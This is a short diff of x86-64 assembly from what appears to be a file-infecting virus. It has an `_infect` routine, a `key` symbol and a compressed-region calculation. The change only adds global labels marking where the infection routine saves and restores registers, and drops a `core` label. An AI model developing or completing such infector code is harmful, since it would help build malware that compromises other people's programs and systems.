@@ -1,5 +1,7 @@
 section .textstart
 global _infect
+global _infect_push
+global _infect_pop
 
 global key
 
@@ -26,6 +28,7 @@ global environ
 ;____________
 
 _infect:
+_infect_push:
 	push rax
 	push rbx
 	push rcx
@@ -33,7 +36,7 @@ _infect:
 	push rsi
 	push rdi
 	push rsp
-core:
+
 	lea rdi, [rel cmpr_start]
 	lea rsi, [rel cmpr_end]
 	sub rsi, rdi ;cmpr_end - cmpr_start
@@ -79,6 +82,7 @@ start2:
 	sub rax, r14
 	mov r14, rax
 
+_infect_pop:
 	pop rsp
 	pop rdi
 	pop rsi
